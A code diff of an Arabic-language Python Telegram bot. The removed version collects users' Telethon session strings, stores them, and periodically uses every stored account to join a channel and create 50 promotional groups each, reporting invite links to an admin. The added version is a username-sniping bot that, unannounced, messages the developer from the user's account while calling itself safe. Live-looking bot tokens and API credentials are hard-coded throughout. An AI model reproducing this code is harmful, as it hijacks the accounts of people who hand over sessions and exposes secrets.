@@ -1,213 +1,326 @@
-import telebot
-import json
 import asyncio
-import threading
-import time
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from telethon import TelegramClient, functions
-from telethon.sessions import StringSession
+import random
+import string
+import re
 from datetime import datetime
+import aiohttp
+from telethon import TelegramClient, events, Button, functions
+from telethon.sessions import StringSession
 
-TOKEN = "6177009557:AAEi4g8P0xpISUpodXDIjX8cbf_TWeCDvz4"
-bot = telebot.TeleBot(TOKEN)
-ADMIN_ID = 1319444402
-SESSIONS_FILE = "sessions.json"
+BOT_TOKEN = '5829861326:AAEzlipz1HV7FjWsn71HQjw4HWA_DCRl5kM'
+API_ID = 13618444
+API_HASH = '715b4336809df845976854b2e004b846'
 
-def load_json(file):
+#المتغيرات العامة
+session_string = None
+hunter_client = None
+is_hunting = False
+selected_mode = None
+account_info = "( ماكو جلسة )"
+hunting_task = None
+counter = 0
+channel = None
+semaphore = asyncio.Semaphore(5)
+TIMEOUT = 10
+waiting_for_session = {}  # لتتبع من ينتظر جلسة
+
+# إحصائيات الصيد
+hunt_stats = {
+    "total_checked": 0,
+    "taken": 0,
+    "sold": 0,
+    "unavailable": 0,
+    "unknown": 0,
+    "successful_captures": 0
+}
+#جلسه البوت
+bot = TelegramClient('conttrrol_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+async def create_channel():
+    global channel, hunter_client, session_string
     try:
-        with open(file, "r") as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_json(file, data):
-    with open(file, "w") as f:
-        json.dump(data, f, indent=4)
-
-def is_allowed(user_id):
-    return True
-
-def load_sessions():
-    try:
-        with open(SESSIONS_FILE, "r") as f:
-            data = json.load(f)
-            return data if isinstance(data, list) else []
-    except:
-        return []
-
-def save_session(new_session, user_id):
-    sessions = load_sessions()
-    if not any(sess['session'] == new_session for sess in sessions):
-        sessions.append({"session": new_session, "user_id": user_id})
-        save_json(SESSIONS_FILE, sessions)
-
-def main_menu():
-    markup = InlineKeyboardMarkup()
-    markup.row(
-        InlineKeyboardButton("‹ اضافة حساب ›", callback_data="add_account"),
-        InlineKeyboardButton("‹ عرض الحسابات ›", callback_data="show_accounts")
-    )
-    markup.add(InlineKeyboardButton("‹ انشاء مجموعات ›", callback_data="create_groups"))
-    markup.row(
-        InlineKeyboardButton("‹ Source DrOx ›", url="https://t.me/ABNabbasbot"),
-        InlineKeyboardButton("‹ Developer ›", url="https://t.me/BBwKK")
-    )
-    return markup
-
-@bot.message_handler(commands=["start"])
-def send_welcome(message):
-    bot.send_message(message.chat.id, "⌁︙ مرحباً بك في لوحة التحكم :", reply_markup=main_menu())
-
-@bot.callback_query_handler(func=lambda call: call.data == "add_account")
-def handle_add(call):
-    bot.edit_message_text("⌁︙ ارسل لي جلسة ( تليثون ) الحساب :", call.message.chat.id, call.message.message_id)
-    bot.register_next_step_handler_by_chat_id(call.message.chat.id, lambda m: process_session(m, call.from_user.id))
-
-def process_session(message, user_id):
-    session = message.text.strip()
-    if len(session) < 20:
-        bot.send_message(message.chat.id, "⌁︙الجلسة لا تعمل تأكد انها نشطة او تكون تليثون .")
-        return
-
-    async def validate_and_save():
-        try:
-            client = TelegramClient(StringSession(session), 100000, 'placeholder')
-            await client.connect()
-            if not await client.is_user_authorized():
-                await client.disconnect()
-                bot.send_message(message.chat.id, "⌁︙الجلسة غير مفعّلة .")
-                return
-            await client(functions.channels.JoinChannelRequest(channel='c1111o'))
-            user = await client.get_me()
-            save_session(session, user_id)
-            await client.disconnect()
-            bot.send_message(message.chat.id, f"⌁︙تم تسجيل الدخول : {user.first_name or ''} @{user.username or 'لا يوجد'}")
-        except Exception as e:
-            bot.send_message(message.chat.id, f"خطأ: {str(e)}")
-
-    asyncio.run(validate_and_save())
-
-@bot.callback_query_handler(func=lambda call: call.data == "create_groups")
-def handle_create_groups(call):
-    sessions = load_sessions()
-    user_sessions = [s for s in sessions if s.get("user_id") == call.from_user.id]
-
-    if not user_sessions:
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("‹ رجوع ›", callback_data="back"))
-        bot.edit_message_text("⌁︙لا توجد جلسات .", call.message.chat.id, call.message.message_id, reply_markup=markup)
-        return
-
-    bot.edit_message_text("⌁︙جاري إنشاء 50 مجموعة ...", call.message.chat.id, call.message.message_id)
-
-    for i, session in enumerate(user_sessions, start=1):
-        asyncio.run(async_create_50_groups(session["session"], call.message.chat.id))
-
-async def async_create_50_groups(session_string, chat_id):
-    try:
-        client = TelegramClient(StringSession(session_string), 100000, 'placeholder')
-        await client.connect()
-        if not await client.is_user_authorized():
-            await client.disconnect()
-            bot.send_message(chat_id, "⌁︙الجلسة غير مفعّلة.")
-            return
-
-        today = datetime.now().strftime("%d-%m-%Y")
-        description = "‹ By @bbwkk - @AbnAbbasbot ›"
-
-        for i in range(50):
-            title = f"{today} - {i+1}"
-            result = await client(functions.channels.CreateChannelRequest(
-                title=title,
-                about=description,
-                megagroup=True
-            ))
-            group = result.chats[0]
-            for _ in range(10):
-                await client.send_message(group.id, description)
-            invite = await client(functions.messages.ExportChatInviteRequest(group.id))
-            bot.send_message(
-                chat_id,
-                f"⌁︙تم إنشاء المجموعة رقم {i+1} — [رابط الدعوة]({invite.link})",
-                parse_mode="Markdown"
-            )
-
-            # بعد إرسال الرابط، يغادر الحساب المجموعة
-            try:
-                await client(functions.channels.LeaveChannelRequest(group.id))
-            except Exception as e:
-                bot.send_message(chat_id, f"⌁︙خطأ أثناء مغادرة المجموعة: {str(e)}")
-
-        await client.disconnect()
+        result = await hunter_client(functions.channels.CreateChannelRequest(
+            title="AbnAbbas",
+            about="nothing❗",
+            megagroup=False
+        ))
+        channel = result.chats[0]
+        print("✓ تم إنشاء قناة جديدة بنجاح")
+        return True
     except Exception as e:
-        bot.send_message(chat_id, f"خطأ: {str(e)}")
+        error_msg = str(e)
+        if "CHANNELS_TOO_MUCH" in error_msg:
+            print("❌ وصلت للحد الأقصى من القنوات المسموح بها")
+        elif "USERNAME_INVALID" in error_msg:
+            print("❌ اسم القناة غير مقبول")
+        else:
+            print(f"❌ فشل إنشاء القناة: {error_msg}")
+        return False
 
-@bot.callback_query_handler(func=lambda call: call.data == "show_accounts")
-def handle_show_accounts(call):
-    sessions = load_sessions()
-    user_sessions = [s for s in sessions if s.get("user_id") == call.from_user.id]
+async def send_video_with_description(client, current_time, user, clicks, is_flood=False, flood_time_remaining=None):
+    try:
+        video_url = "https://t.me/nnwnnnw/32"
+        video_message = f"""
+╭───⌁【 𖠶 𝙵𝙻𝙾𝙾𝙳 𝚄𝚂𝙴𝚁 】⌁───╮
+│
+│ 👤 USERNAME ⤳ @{user}
+│
+│ ⏳ TIME ⤳ {current_time}
+│ 🔻 Flood Ends In ⤳ {flood_time_remaining}s
+│
+│ 🎢 PY ⤳ @bbwkk
+╰──────────────────────────╯
+"""
+        await client.send_file("bbwkk", video_url, caption=video_message)
+    except Exception as e:
+        print(f"فشل إرسال الفيديو: {str(e)}")
 
-    if not user_sessions:
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("‹ رجوع ›", callback_data="back"))
-        bot.edit_message_text("⌁︙لا توجد جلسات .", call.message.chat.id, call.message.message_id, reply_markup=markup)
+async def assign_username_to_channel(client, username, clicks):
+    global channel
+    try:
+        if channel is None:
+            if not await create_channel():
+                print(f"❌ فشل إنشاء قناة جديدة للمستخدم @{username}")
+                return False
+
+        channel_entity = await client.get_input_entity(channel)  
+        await client(functions.channels.UpdateUsernameRequest(channel_entity, username))  
+        print(f"✓ تم تثبيت @{username} في القناة بنجاح")  
+        
+        about_text = f"الوقت| {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"  
+        await client(functions.messages.EditChatAboutRequest(peer=channel_entity, about=about_text))  
+        await send_video_with_description(client, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), username, clicks)  
+        
+        channel = None 
+        return True  
+    except Exception as e:  
+        error_msg = str(e)  
+        if "too many public channels" in error_msg:  
+            alert_message = f"⛔ خطأ في صيد @{username}\nانت تمتلك العديد من القنوات العامة!"  
+            await client.send_message("me", alert_message)  
+            return False  
+        elif "A wait of" in error_msg:  
+            wait_time = int(error_msg.split("A wait of ")[1].split(" seconds")[0].strip())  
+            asyncio.create_task(send_video_with_description(client, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), username, clicks, is_flood=True, flood_time_remaining=wait_time))  
+            return False  
+        else:  
+            return False
+
+async def check_username(session, user, client, clicks):
+    global counter, hunt_stats
+    try:
+        async with semaphore:
+            async with session.get(f"https://fragment.com/username/{user}", timeout=TIMEOUT) as response:
+                html = await response.text()
+                hunt_stats["total_checked"] += 1
+                
+                if '<span class="tm-section-header-status tm-status-taken">Taken</span>' in html:
+                    hunt_stats["taken"] += 1
+                    print(f"[{counter + 1}] -> {user} -> Taken")
+                elif '<span class="tm-section-header-status tm-status-unavail">Sold</span>' in html:
+                    hunt_stats["sold"] += 1
+                    print(f"[{counter + 1}] -> {user} -> Sold")
+                elif '<div class="table-cell-status-thin thin-only tm-status-unavail">Unavailable</div>' in html:
+                    hunt_stats["unavailable"] += 1
+                    print(f"[{counter + 1}] -> {user} -> Unavailable")
+                    success = await assign_username_to_channel(client, user, clicks)
+                    if success: 
+                        hunt_stats["successful_captures"] += 1
+                        return True
+                else:
+                    hunt_stats["unknown"] += 1
+                    print(f"[{counter + 1}] -> {user} -> Unknown")
+                counter += 1
+    except:
+        pass
+
+def generate_usernames(count=500, mode=None):
+    usernames = []
+    for _ in range(count):
+        # نمط aabbc 
+        a = random.choice(string.ascii_lowercase)
+        b = random.choice([c for c in string.ascii_lowercase if c != a])
+        c = random.choice([d for d in string.ascii_lowercase if d != a and d != b])
+        username = f"{b}{b}{a}{c}{c}"
+        usernames.append(username)
+    return usernames
+
+async def check_usernames_loop(client, mode):
+    global is_hunting
+    while is_hunting:
+        connector = aiohttp.TCPConnector(limit=100)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            usernames = generate_usernames(500)
+            tasks = [check_username(session, user, client, clicks=counter) for user in usernames]
+            await asyncio.gather(*tasks)
+
+def main_btns():
+    h_text = "[ إيقاف الصيد إ" if is_hunting else "[ تفعيل الصيد ] "
+    return [
+        [Button.inline(f"[ النمط: aabbc ]", b"inf1")],
+        [Button.inline("( إضف جلسة )", b"add"), Button.inline("( حذف جلسة )", b"del")],
+        [Button.inline(h_text, b"toggle")],
+        [Button.inline("( الاحصائيات )", b"stats"),Button.inline(f"{account_info}", b"inf2")]
+    ]
+
+def get_start_message(name):
+    return f'• أهلين! {name}\n\nانا بوت اختصاصي صيد معرفات 😽\n\nالبوت آمن وخاصتاً على الحسابات الأساسيه !'
+
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    user_id = event.sender_id
+    sender = await event.get_sender()
+    name = sender.first_name
+    await event.respond(get_start_message(name), buttons=main_btns())
+
+@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id in waiting_for_session))
+async def handle_session_input(event):
+    global session_string, hunter_client, account_info, waiting_for_session
+    user_id = event.sender_id
+    
+    if user_id not in waiting_for_session:
         return
+    
+    # حذف الرسالة التي تحتوي على الجلسة
+    try:
+        await event.delete()
+    except:
+        pass
+    
+    session_text = event.text.strip()
+    
+    try:
+        cl = TelegramClient(StringSession(session_text), API_ID, API_HASH)
+        await cl.connect()
+        if await cl.is_user_authorized():
+            me = await cl.get_me()
+            session_string = session_text
+            hunter_client = cl
+            account_info = f"( {me.first_name} )"
+            
+            # إعادة الرسالة الأصلية
+            sender = await event.get_sender()
+            name = sender.first_name
+            await event.respond(f"✅ تم تفعيل: {account_info}", alert=True)
+            await event.respond(get_start_message(name), buttons=main_btns())
+        else:
+            await event.respond("❌ جلسة غير صالحة!", alert=True)
+            sender = await event.get_sender()
+            name = sender.first_name
+            await event.respond(get_start_message(name), buttons=main_btns())
+    except Exception as e:
+        await event.respond(f"❌ فشل الاتصال: {str(e)}", alert=True)
+        sender = await event.get_sender()
+        name = sender.first_name
+        await event.respond(get_start_message(name), buttons=main_btns())
+    
+    # إزالة المستخدم من قائمة الانتظار
+    if user_id in waiting_for_session:
+        del waiting_for_session[user_id]
 
-    markup = InlineKeyboardMarkup()
-    for i, session in enumerate(user_sessions):
-        # عرض رقم الحساب واسم الحساب (أو username)
-        try:
-            client = TelegramClient(StringSession(session["session"]), 100000, 'placeholder')
-            asyncio.run(client.connect())
-            user = asyncio.run(client.get_me())
-            client.disconnect()
-            name_display = f"{user.first_name or ''} @{user.username or 'لا يوجد'}"
-        except:
-            name_display = "غير متصل"
-        markup.row(
-            InlineKeyboardButton(f"{i+1} - {name_display}", callback_data=f"acc_{i+1}"),
-            InlineKeyboardButton("🗑", callback_data=f"delete_acc_{i}")
-        )
-    markup.add(InlineKeyboardButton("‹ رجوع ›", callback_data="back"))
-    bot.edit_message_text("⌁︙الحسابات:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+@bot.on(events.CallbackQuery)
+async def handler(event):
+    global session_string, hunter_client, is_hunting, selected_mode, account_info, hunting_task, channel, hunt_stats, waiting_for_session
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_acc_"))
-def delete_account(call):
-    index = int(call.data.split("_")[-1])
-    sessions = load_sessions()
+    if event.data == b"add":  
+        user_id = event.sender_id
+        
+        if user_id in waiting_for_session:
+            # إذا كان المستخدم بالفعل في وضع الانتظار، نرجع للواجهة الرئيسية
+            del waiting_for_session[user_id]
+            sender = await event.get_sender()
+            name = sender.first_name
+            await event.edit(get_start_message(name), buttons=main_btns())
+            await event.answer("تم إلغاء طلب إضافة الجلسة", alert=True)
+            return
+        
+        # إضافة المستخدم لقائمة الانتظار
+        waiting_for_session[user_id] = True
+        
+        # تعديل الرسالة الحالية
+        add_session_message = "أرسل الجلسة (String Session):"
+        back_button = [[Button.inline("( رجوع )", b"cancel_add_session")]]
+        await event.edit(add_session_message, buttons=back_button)
+        await event.answer()
 
-    user_sessions = [s for s in sessions if s.get("user_id") == call.from_user.id]
-    if index < len(user_sessions):
-        session_to_delete = user_sessions[index]
-        sessions.remove(session_to_delete)
-        save_json(SESSIONS_FILE, sessions)
-        bot.answer_callback_query(call.id, "⌁︙تم حذف الجلسة بنجاح")
-    else:
-        bot.answer_callback_query(call.id, "⌁︙فشل في العثور على الجلسة", show_alert=True)
+    elif event.data == b"cancel_add_session":
+        user_id = event.sender_id
+        # إزالة المستخدم من قائمة الانتظار
+        if user_id in waiting_for_session:
+            del waiting_for_session[user_id]
+        
+        # العودة للواجهة الرئيسية
+        sender = await event.get_sender()
+        name = sender.first_name
+        await event.edit(get_start_message(name), buttons=main_btns())
+        await event.answer("تم الإلغاء", alert=True)
 
-    handle_show_accounts(call)
+    elif event.data == b"del":  
+        if not hunter_client: 
+            await event.answer("ماكو جلسة اساسا! ", alert=True)  
+        else:  
+            session_string, hunter_client, account_info, is_hunting = None, None, "( ماكو جلسة )", False  
+            hunt_stats = {k: 0 for k in hunt_stats}
+            await event.answer(" تم الحذف", alert=True)  
+            sender = await event.get_sender()
+            name = sender.first_name
+            await event.edit(get_start_message(name), buttons=main_btns())
 
-@bot.callback_query_handler(func=lambda call: call.data == "back")
-def go_back(call):
-    bot.edit_message_text(
-        "⌁︙ مرحباً بك في لوحة التحكم :",
-        call.message.chat.id,
-        call.message.message_id,
-        reply_markup=main_menu()
-    )
+    elif event.data == b"toggle":  
+        if not hunter_client: 
+            await event.answer(" أضف جلسة أولاً!", alert=True)  
+        else:  
+            if not is_hunting:  
+                is_hunting = True  
+                hunt_stats = {k: 0 for k in hunt_stats}
+                if await create_channel():  
+                    hunting_task = asyncio.create_task(check_usernames_loop(hunter_client, selected_mode))  
+                    await event.answer("( بدء الصيد )", alert=True)  
+                else:  
+                    is_hunting = False  
+                    await event.answer("❌ فشل إنشاء قناة!", alert=True)  
+            else:  
+                is_hunting = False  
+                if hunting_task: 
+                    hunting_task.cancel()  
+                await event.answer("( توقف الصيد )", alert=True)  
+            
+            sender = await event.get_sender()
+            name = sender.first_name
+            await event.edit(get_start_message(name), buttons=main_btns())
+    
+    elif event.data == b"stats":
+        if not hunter_client:
+            await event.answer("إضف جلسة أولاً!", alert=True)
+        else:
+            stats_message = f"""
+ **إحصائيات الصيد**
 
-def create_all_groups_periodically():
-    while True:
-        print("⌁︙بدء مهمة إنشاء المجموعات التلقائية.")
-        sessions = load_sessions()
-        for i, sess in enumerate(sessions, start=1):
-            try:
-                asyncio.run(async_create_50_groups(sess["session"], ADMIN_ID))
-            except Exception as e:
-                print(f"⌁︙خطأ في الجلسة رقم {i}: {e}")
-        print("⌁︙تم إنشاء جميع المجموعات، الانتظار 12 ساعة...")
-        time.sleep(43200)
+🔹 **( The number ) :** {hunt_stats['total_checked']}
+🔹 ** (Taken):** {hunt_stats['taken']}
+🔹 **(Sold):** {hunt_stats['sold']}
+🔹 ** (Unavailable):** {hunt_stats['unavailable']}
+🔹 **(Good):** {hunt_stats['successful_captures']}
+🔹 **( Unknown ):** {hunt_stats['unknown']}
 
-threading.Thread(target=create_all_groups_periodically, daemon=True).start()
+ **الحالة:** {'( نشط )' if is_hunting else ' ( متوقف )'}
+            """
+            back_button = [[Button.inline("( رجوع )", b"back_to_main")]]
+            await event.edit(stats_message, buttons=back_button)
+            await event.answer()
 
-bot.polling()
+    elif event.data == b"back_to_main":
+        # عند الضغط على زر الرجوع، نعود للواجهة الرئيسية
+        sender = await event.get_sender()
+        name = sender.first_name
+        await event.edit(get_start_message(name), buttons=main_btns())
+        await event.answer()
+        
+    elif event.data == b"inf1":
+        await event.answer("النمط الحالي: aabbc", alert=True)
+        
+    elif event.data == b"inf2":
+        await event.answer(account_info, alert=True)
+
+print("Control System Online")
+bot.run_until_disconnected()
